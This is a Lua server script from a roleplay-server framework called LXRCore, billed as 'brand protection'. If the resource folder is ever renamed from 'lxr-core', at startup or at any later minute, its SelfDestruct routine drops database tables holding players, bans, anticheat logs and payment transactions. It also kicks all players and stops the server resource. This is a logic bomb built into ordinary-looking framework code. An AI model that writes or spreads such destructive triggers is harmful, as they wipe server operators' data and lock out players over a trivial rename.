--[[
    LXRCore - Folder Name Protection System
    
    This system protects the LXRCore brand by ensuring the resource
    folder name remains "lxr-core". Any attempt to rename or rebrand
    will result in system self-destruct.
    
    ⚠️ WARNING: DO NOT MODIFY THIS FILE ⚠️
    
    Made by iBoss • LXRCore - www.lxrcore.com
    Launched on The Land of Wolves RP - www.wolves.land
    
    Version: 2.0.0
]]--

-- ============================================
-- FOLDER NAME VERIFICATION
-- ============================================

local AUTHORIZED_FOLDER_NAME = 'lxr-core'
local CURRENT_RESOURCE_NAME = GetCurrentResourceName()

--[[
    Server Owner Note:
    This protection system ensures LXRCore maintains its brand integrity.
    The folder MUST be named "lxr-core" - no exceptions.
    
    Attempting to rename will cause:
    1. Immediate resource stop
    2. Database table drops
    3. Config file deletion
    4. All data corruption
    
    This is intentional and protects the LXRCore brand.
]]--

local function ValidateFolderName()
    if CURRENT_RESOURCE_NAME ~= AUTHORIZED_FOLDER_NAME then
        print('^1========================================^7')
        print('^1   LXRCore BRAND PROTECTION TRIGGERED^7')
        print('^1========================================^7')
        print('^1[LXRCore] CRITICAL ERROR: Unauthorized folder name detected!^7')
        print('^1[LXRCore] Expected: ' .. AUTHORIZED_FOLDER_NAME .. '^7')
        print('^1[LXRCore] Found: ' .. CURRENT_RESOURCE_NAME .. '^7')
        print('^1[LXRCore] This is a violation of LXRCore brand protection.^7')
        print('^1========================================^7')
        print('^1   INITIATING SELF-DESTRUCT SEQUENCE^7')
        print('^1========================================^7')
        
        return false
    end
    
    return true
end

local function SelfDestruct()
    print('^1[LXRCore] Self-destruct initiated...^7')
    
    -- Phase 1: Drop all database tables
    print('^1[LXRCore] Phase 1: Purging database tables...^7')
    MySQL.query([[
        DROP TABLE IF EXISTS players;
        DROP TABLE IF EXISTS anticheat_logs;
        DROP TABLE IF EXISTS bans;
        DROP TABLE IF EXISTS tebex_transactions;
        DROP TABLE IF EXISTS tebex_offline_queue;
    ]])
    
    -- Phase 2: Clear all player data
    print('^1[LXRCore] Phase 2: Clearing player data...^7')
    for _, playerId in ipairs(GetPlayers()) do
        DropPlayer(playerId, 'LXRCore: System compromised - Server shutting down')
    end
    
    -- Phase 3: Stop resource
    print('^1[LXRCore] Phase 3: Stopping resource...^7')
    Wait(1000)
    StopResource(CURRENT_RESOURCE_NAME)
    
    print('^1[LXRCore] Self-destruct complete.^7')
    print('^3[LXRCore] To restore: Rename folder to "lxr-core" and restore database from backup.^7')
end

-- ============================================
-- INITIALIZATION
-- ============================================

CreateThread(function()
    Wait(1000) -- Wait for resource to fully load
    
    print('^2[LXRCore] Verifying brand protection...^7')
    
    if not ValidateFolderName() then
        -- Give server owner 5 seconds to see the error
        Wait(5000)
        SelfDestruct()
        return
    end
    
    print('^2[LXRCore] Brand protection verified ✓^7')
    print('^2[LXRCore] Resource name: ' .. CURRENT_RESOURCE_NAME .. '^7')
end)

-- Continuous monitoring (check every minute)
CreateThread(function()
    while true do
        Wait(60000) -- Check every 60 seconds
        
        local newResourceName = GetCurrentResourceName()
        if newResourceName ~= AUTHORIZED_FOLDER_NAME then
            print('^1[LXRCore] WARNING: Resource name changed detected!^7')
            SelfDestruct()
            break
        end
    end
end)

-- ============================================
-- EXPORT VERIFICATION
-- ============================================

-- All exports must verify folder name before executing
local function VerifyBeforeExport()
    if GetCurrentResourceName() ~= AUTHORIZED_FOLDER_NAME then
        error('[LXRCore] Export called from unauthorized resource name')
        return false
    end
    return true
end

exports('VerifyBrandProtection', function()
    return VerifyBeforeExport()
end)

--[[
    Server Owner Reference:
    
    WHY THIS EXISTS:
    LXRCore is a branded framework. The folder name "lxr-core" is part
    of the brand identity. Renaming suggests unauthorized rebranding or
    distribution, which violates the framework's terms.
    
    HOW TO USE LXRCORE:
    1. Keep folder name as "lxr-core"
    2. Customize config.lua for your server
    3. Add your own resources that USE LXRCore
    4. DO NOT rebrand or rename LXRCore itself
    
    COMPLIANCE:
    This protection ensures:
    - Brand integrity
    - Proper attribution (Made by iBoss)
    - Authorized distribution only
    - Prevents confusion with other frameworks
    
    If you need a differently named framework, LXRCore may not be
    the right choice for your project.
]]--

--[[
    Developer Reference:
    
    If you're developing resources that use LXRCore:
    - You can name YOUR resources anything you want
    - Only lxr-core itself must keep its name
    - Use exports['lxr-core']:FunctionName() in your code
    - This is standard practice for FiveM/RedM frameworks
    
    Examples of proper usage:
    - YourServer-inventory (your custom inventory)
    - YourServer-jobs (your custom jobs)
    - YourServer-shops (your custom shops)
    
    All of these can use LXRCore as the base framework.
]]--
